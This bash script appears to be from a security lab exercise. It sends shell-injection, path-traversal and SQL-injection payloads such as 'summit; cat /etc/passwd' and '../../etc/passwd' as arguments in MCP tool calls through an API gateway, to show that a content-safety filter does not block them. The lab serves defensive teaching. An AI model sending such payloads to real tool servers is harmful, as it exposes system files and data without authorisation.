#!/bin/bash
# Waypoint 1.1: Exploit - Technical Injection Bypass
# Demonstrates that technical injection patterns bypass Layer 1 (Content Safety)
# Content Safety with Prompt Shields catches harmful content and jailbreaks,
# but NOT technical injection patterns like shell commands, SQL, or path traversal.
# Usage: ./1.1-exploit-injection.sh [sherpa|trails]
set -e

cd "$(dirname "${BASH_SOURCE[0]}")/.."

TARGET="${1:-sherpa}"
if [[ "$TARGET" != "sherpa" && "$TARGET" != "trails" ]]; then
    echo "Usage: $0 [sherpa|trails]"
    exit 1
fi

echo ""
echo "=========================================="
echo "Waypoint 1.1: Technical Injection Bypass"
echo "Target: $TARGET"
echo "=========================================="
echo ""

APIM_URL=$(azd env get-value APIM_GATEWAY_URL)
MCP_APP_CLIENT_ID=$(azd env get-value MCP_APP_CLIENT_ID)
TOKEN=$(az account get-access-token --resource "$MCP_APP_CLIENT_ID" --query accessToken -o tsv)

echo "Content Safety (Layer 1) catches harmful content and jailbreaks."
echo "But it does NOT detect technical injection patterns."
echo ""

if [ "$TARGET" = "sherpa" ]; then
    # Initialize session for Sherpa MCP
    echo "Initializing Sherpa MCP session..."
    curl -s -D /tmp/mcp-headers.txt --max-time 10 -X POST "$APIM_URL/sherpa/mcp" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" \
      -d '{"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}},"id":1}' > /dev/null
    SESSION_ID=$(grep -i "mcp-session-id" /tmp/mcp-headers.txt | sed 's/.*: *//' | tr -d '\r\n')
    echo "Session: $SESSION_ID"
    echo ""

    echo "Test 1: Shell Injection - 'summit; cat /etc/passwd'"
    HTTP=$(curl -s -w "\n%{http_code}" --max-time 15 -X POST "$APIM_URL/sherpa/mcp" \
      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" -H "Mcp-Session-Id: $SESSION_ID" \
      -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_weather","arguments":{"location":"summit; cat /etc/passwd"}},"id":2}' | tail -1)
    echo "  Status: $HTTP"; [ "$HTTP" = "200" ] && echo "  BYPASSED - Content Safety did not block!"
    echo ""

    echo "Test 2: Path Traversal - '../../etc/passwd'"
    HTTP=$(curl -s -w "\n%{http_code}" --max-time 15 -X POST "$APIM_URL/sherpa/mcp" \
      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" -H "Mcp-Session-Id: $SESSION_ID" \
      -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"check_trail_conditions","arguments":{"trail_id":"../../etc/passwd"}},"id":3}' | tail -1)
    echo "  Status: $HTTP"; [ "$HTTP" = "200" ] && echo "  BYPASSED - Content Safety did not block!"
    echo ""

    echo "Test 3: SQL Injection - \"' OR '1'='1\""
    HTTP=$(curl -s -w "\n%{http_code}" --max-time 15 -X POST "$APIM_URL/sherpa/mcp" \
      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" -H "Mcp-Session-Id: $SESSION_ID" \
      -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_weather","arguments":{"location":"Denver'\'' OR '\''1'\''='\''1"}},"id":4}' | tail -1)
    echo "  Status: $HTTP"; [ "$HTTP" = "200" ] && echo "  BYPASSED - Content Safety did not block!"

else
    # Trail MCP (APIM-synthesized) - client generates session ID
    # APIM accepts client-provided Mcp-Session-Id for rate limiting/tracking
    SESSION_ID="session-$(date +%s)"
    echo "Using Trail MCP session: $SESSION_ID"
    echo ""

    echo "Test 1: Shell Injection via permitId - 'PRM-2025; cat /etc/passwd'"
    HTTP=$(curl -s -w "\n%{http_code}" --max-time 8 -X POST "$APIM_URL/trails/mcp" \
      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" -H "Mcp-Session-Id: $SESSION_ID" \
      -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get-permit","arguments":{"permitId":"PRM-2025; cat /etc/passwd"}},"id":1}' | tail -1)
    echo "  Status: $HTTP"; [ "$HTTP" = "200" ] && echo "  BYPASSED - Content Safety did not block!"
    echo ""

    echo "Test 2: Path Traversal via permitId - '../../etc/passwd'"
    HTTP=$(curl -s -w "\n%{http_code}" --max-time 8 -X POST "$APIM_URL/trails/mcp" \
      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" -H "Mcp-Session-Id: $SESSION_ID" \
      -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get-permit-holder","arguments":{"permitId":"../../etc/passwd"}},"id":2}' | tail -1)
    echo "  Status: $HTTP"; [ "$HTTP" = "200" ] && echo "  BYPASSED - Content Safety did not block!"
    echo ""

    echo "Test 3: SQL-like Injection via permitId - 'PRM-0001 OR 1=1'"
    HTTP=$(curl -s -w "\n%{http_code}" --max-time 8 -X POST "$APIM_URL/trails/mcp" \
      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
      -H "Accept: application/json, text/event-stream" -H "Mcp-Session-Id: $SESSION_ID" \
      -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get-permit","arguments":{"permitId":"PRM-0001 OR 1=1"}},"id":3}' | tail -1)
    echo "  Status: $HTTP"; [ "$HTTP" = "200" ] && echo "  BYPASSED - Content Safety did not block!"
fi

echo ""
echo "=========================================="
echo "Layer 1 is NOT designed for technical injection detection."
echo "This is why we need Layer 2: Input Validation"
echo "=========================================="
